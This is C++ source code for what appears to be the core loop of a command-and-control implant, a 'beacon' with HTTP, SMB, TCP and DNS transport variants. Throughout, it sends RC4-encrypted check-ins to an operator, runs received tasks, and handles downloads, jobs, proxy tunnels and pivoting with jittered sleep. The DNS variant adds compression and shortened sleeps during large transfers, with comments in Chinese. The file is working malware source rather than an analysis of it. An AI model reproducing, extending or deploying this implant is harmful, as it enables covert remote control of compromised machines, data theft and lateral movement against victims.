#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent* g_Agent;

#if defined(BEACON_HTTP) 

#include "ConnectorHTTP.h"
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) 
		return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );
			g_Agent->commander->ProcessCommandTasks( g_Connector->RecvData(), g_Connector->RecvSize(), packerOut );
		}
		g_Connector->RecvClear();


		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
			WaitMask(g_Agent->GetWorkingSleep(), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloader(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_SMB) 

#include "ConnectorSMB.h"
ConnectorSMB* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorSMB*)MemAllocLocal(sizeof(ConnectorSMB));
	*g_Connector = ConnectorSMB();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while ( g_Connector->RecvSize() >= 0 && g_Agent->IsActive() ) {

    		if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}

			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
				TEB->LastErrorValue = 0;
				break;
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_TCP)

#include "ConnectorTCP.h"
ConnectorTCP* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorTCP*)MemAllocLocal(sizeof(ConnectorTCP));
	*g_Connector = ConnectorTCP();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		while (g_Connector->RecvSize() >= 0 && g_Agent->IsActive()) {

			if (g_Connector->RecvSize() > 0 && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}


#elif defined(BEACON_DNS)

#include "ConnectorDNS.h"
ConnectorDNS* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
	*g_Connector = ConnectorDNS();
		
	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);
		
	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize))
		return;

	// For DNS transport, the initial beat must be sent once over the
	// connector so that the listener can see the "HI" packet, decrypt
	// it with the listener encrypt_key, and create the agent session.
	// Subsequent traffic uses the normal loop below (PUT/GET).
	g_Connector->SendData(beat, beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			// 先写入原始长度头
			packerOut->Set32(0, packerOut->datasize());

			BYTE* plainBuf = packerOut->data();
			ULONG plainLen = packerOut->datasize();

			// 会话层封装：[flags][orig_len_le][payload]
			BYTE* sessionBuf = NULL;
			ULONG sessionLen = 0;

			// 只对长度头之后的业务数据尝试压缩
			BYTE* payload    = plainBuf + 4;
			ULONG payloadLen = plainLen - 4;

			BYTE* compBuf = NULL;
			ULONG compLen = 0;
			BYTE  flags   = 0;

    	if (payloadLen > 1024 && CompressLZNT1(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen < payloadLen) {
        // 有压缩收益
        flags     = 1;
        sessionLen = 1 + 4 + compLen;
        sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
        if (sessionBuf) {
            sessionBuf[0] = flags;
            sessionBuf[1] = (BYTE)(payloadLen & 0xFF);
            sessionBuf[2] = (BYTE)((payloadLen >> 8) & 0xFF);
            sessionBuf[3] = (BYTE)((payloadLen >> 16) & 0xFF);
            sessionBuf[4] = (BYTE)((payloadLen >> 24) & 0xFF);
            memcpy(sessionBuf + 5, compBuf, compLen);
        }
        MemFreeLocal((LPVOID*)&compBuf, compLen);
    }

    if (!flags || !sessionBuf) {
        // 不压缩或压缩失败：flags=0，payload=原始业务数据
        flags      = 0;
        sessionLen = 1 + 4 + payloadLen;
        sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
        if (sessionBuf) {
            sessionBuf[0] = flags;
            sessionBuf[1] = (BYTE)(payloadLen & 0xFF);
            sessionBuf[2] = (BYTE)((payloadLen >> 8) & 0xFF);
            sessionBuf[3] = (BYTE)((payloadLen >> 16) & 0xFF);
            sessionBuf[4] = (BYTE)((payloadLen >> 24) & 0xFF);
            memcpy(sessionBuf + 5, payload, payloadLen);
        }
    }

    if (!sessionBuf) {
        // 内存分配失败，退回原逻辑
        EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
        g_Connector->SendData(plainBuf, plainLen);
    } else {
        // RC4 加密封装后的会话缓冲
        EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
        g_Connector->SendData(sessionBuf, sessionLen);
        MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
    }

    packerOut->Clear(TRUE);
    packerOut->Pack32(0);
} else {
    g_Connector->SendData(NULL, 0);
}

		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
		}
		g_Connector->RecvClear();

		// 自适应 sleep：大流量时在 0~0.5 倍基础 sleep 区间内随机等待，任务结束后恢复原始 sleep/jitter。
		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
			ULONG baseSleep = g_Agent->config->sleep_delay;
			ULONG jitter    = g_Agent->config->jitter_delay;

			BOOL burst = FALSE;
			// 阈值 512KB：认为正在传输大任务
			if ((g_Connector->lastUpTotal >= (512 * 1024)) || (g_Connector->lastDownTotal >= (512 * 1024))) {
				burst = TRUE;
			}

			if (burst) {
				// 以 baseSleep/2 作为 "最大值"，交给 WaitMask 结合 jitter 产生 0~0.5 倍基础 sleep 的等待
				ULONG halfSleep = baseSleep / 2;
				if (halfSleep == 0)
					halfSleep = baseSleep;
				WaitMask(g_Agent->GetWorkingSleep(), halfSleep, jitter);
				// 用完一轮后清零统计，后续再根据新一轮大任务重新进入 burst
				g_Connector->lastUpTotal   = 0;
				g_Connector->lastDownTotal = 0;
			} else {
				// 正常情况下沿用原始 sleep/jitter
				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
			}
		}

		g_Agent->downloader->ProcessDownloader(packerOut);
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while (g_Agent->IsActive());

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}

#endif

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
